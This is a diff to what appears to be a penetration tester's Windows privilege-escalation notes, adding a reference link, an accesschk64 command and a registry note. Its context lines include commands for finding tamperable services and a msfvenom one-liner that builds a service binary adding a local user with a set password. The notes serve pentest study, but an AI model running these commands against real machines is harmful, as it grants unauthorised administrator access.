@@ -342,6 +342,8 @@ https://gist.github.com/sckalath/8dacd032b65404ef7411
 
 https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
 
+https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+
 Exploit Suggester scripts(kernel)
 
 ### Windows
@@ -393,6 +395,7 @@ tasklist /SVC
 
 #### Services(DLL, binpath, registry, exe)
 `accesschk64.exe -wuvqc "user" *` searches for services that can be tampered with by those in user group
+accesschk64.exe -uwcqv "user" *
 `accesschk64.exe -wuvc [service]` - checks permissions on service 
 
 ##### Finding vulnerable services(binpath)
@@ -445,6 +448,10 @@ Example had you look for SERVICE_CHANGE_CONFIG permission for users to be writea
 
 `wmic service get name,pathname,startmode` - find unquoted file paths for services
 `msfvenom -p windows/exec CMD='net user /add qoute qoute123' -f exe-service -o common.exe` - creates binary to run in unquoted path, name of binary must be in path for this to work. then restart service
+
+##### Registry
+use sagishahar and pentestblog to check if registry key for services is writeable
+
 
 #### Autorun
 We're looking for execeutables that are automaticaly executed on some event (logon tab for autorun). Hopefully one of these executables has had poor misconfigurations for permissionsC
